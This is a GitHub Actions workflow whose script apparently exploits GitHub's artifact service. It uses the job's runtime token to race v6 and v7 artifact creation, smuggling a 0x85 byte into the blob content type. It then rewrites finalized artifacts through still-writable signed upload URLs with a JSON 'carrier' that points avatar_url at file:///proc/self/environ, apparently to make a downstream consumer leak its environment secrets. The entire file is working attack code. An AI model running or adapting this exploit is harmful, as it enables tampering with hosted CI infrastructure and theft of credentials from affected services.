name: race

on:
  workflow_dispatch:

jobs:
  race:
    runs-on: ubuntu-latest
    permissions:
      actions: write
      contents: read
    steps:
      - uses: actions/github-script@v7
        with:
          script: |
            const https = require('node:https');
            const crypto = require('node:crypto');

            const endpoint = process.env.ACTIONS_RESULTS_URL || '';
            const token = process.env.ACTIONS_RUNTIME_TOKEN || '';
            if (!endpoint || !token) { core.setFailed('no runtime credentials'); return; }

            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString('utf8'));
            let runBackendId, jobBackendId;
            for (const scope of String(claims.scp || '').split(' ')) {
              if (scope.startsWith('Actions.Results:')) {
                const p = scope.split(':'); runBackendId = p[1]; jobBackendId = p[2];
              }
            }
            if (!runBackendId) { core.setFailed('no Actions.Results scope'); return; }

            const SVC = endpoint.replace(/\/+$/, '')
              + '/twirp/github.actions.results.api.v1.ArtifactService/';
            // One U+0085: node writes header blocks as latin1, so the blob content type
            // lands as a single 0x85 byte. python .strip() eats it, JS .trim() does not.
            const ODD = '\u0085application/json';
            const IDS = {
              workflow_run_backend_id: runBackendId,
              workflow_job_run_backend_id: jobBackendId,
            };
            const repo = process.env.GITHUB_REPOSITORY;

            async function rpc(method, body) {
              const r = await fetch(SVC + method, {
                method: 'POST',
                headers: { Authorization: 'Bearer ' + token, 'Content-Type': 'application/json' },
                body: JSON.stringify(body),
              });
              const text = await r.text();
              if (r.status !== 200) throw new Error(`${method} ${r.status} ${text.slice(0, 140)}`);
              return JSON.parse(text);
            }

            const createArtifact = (name, version, mime) =>
              rpc('CreateArtifact', { ...IDS, name, version, mime_type: mime });
            const finalizeArtifact = (name, bytes) =>
              rpc('FinalizeArtifact', { ...IDS, name, size: String(bytes.length),
                hash: 'sha256:' + crypto.createHash('sha256').update(bytes).digest('hex') });

            function upload(signedUrl, body) {
              return new Promise((resolve, reject) => {
                const u = new URL(signedUrl);
                const req = https.request({
                  method: 'PUT', hostname: u.hostname, path: u.pathname + u.search,
                  headers: {
                    'x-ms-blob-type': 'BlockBlob',
                    'x-ms-blob-content-type': ODD,
                    'x-ms-version': '2021-08-06',
                    'content-length': Buffer.byteLength(body),
                  },
                }, (res) => {
                  res.resume();
                  res.on('end', () => res.statusCode < 300
                    ? resolve(res.statusCode)
                    : reject(new Error('blob PUT ' + res.statusCode)));
                });
                req.on('error', reject);
                req.end(body);
              });
            }

            const uploadUrlOf = (r) => r.signedUploadUrl || r.signed_upload_url;
            const idOf = (r) => String(r.artifactId || r.artifact_id || '');

            function carrier(artifactId) {
              return Buffer.from(JSON.stringify({
                full_name: `${repo}/actions/artifacts/${artifactId}/zip`,
                owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
                description: 'repo cassette carrier',
                stargazers_count: 0,
              }));
            }

            // A shared-name v6/v7 creation race: v6 stores mime_type without validating
            // it, v7 is the version whose delivery honours mime_type. Racing both creates
            // (and both finalizes) on one name can leave the v6 metadata on the v7
            // delivery path, which is the only way to get a 0x85 into the Content-Type.
            async function race(index) {
              const name = `carrier-${index}-${Date.now()}`;
              const specs = index % 2
                ? [[7, 'application/json'], [6, ODD]]
                : [[6, ODD], [7, 'application/json']];
              const created = await Promise.all(
                specs.map(([version, mime]) => createArtifact(name, version, mime)));
              const placeholder = Buffer.from('{"probe":"placeholder"}');
              await Promise.all(created.map(c => upload(uploadUrlOf(c), placeholder)));

              const settled = await Promise.allSettled([
                finalizeArtifact(name, placeholder),
                finalizeArtifact(name, placeholder),
              ]);
              const ids = [...new Set(settled
                .filter(s => s.status === 'fulfilled')
                .map(s => idOf(s.value))
                .filter(Boolean))];
              if (!ids.length) throw new Error('both finalizes failed');

              // The signed upload URLs stay writable after finalization, which is how the
              // body can reference its own artifact id.
              for (const id of ids) {
                const bytes = carrier(id);
                await Promise.all(created.map(c => upload(uploadUrlOf(c), bytes)));
              }
              const id = ids.at(-1);
              const bytes = carrier(id);
              return { name, id, ids, repository: `${repo}/actions/artifacts/${id}/zip`,
                sha256: crypto.createHash('sha256').update(bytes).digest('hex') };
            }

            const built = [];
            for (let index = 0; index < 64; index += 1) {
              try {
                const result = await race(index);
                built.push(result);
                core.info(`BUILT ${JSON.stringify(result)}`);
              } catch (error) {
                core.info(`SKIPPED ${index}: ${String(error.message).slice(0, 160)}`);
              }
            }
            core.info(`MANIFEST ${JSON.stringify(built)}`);
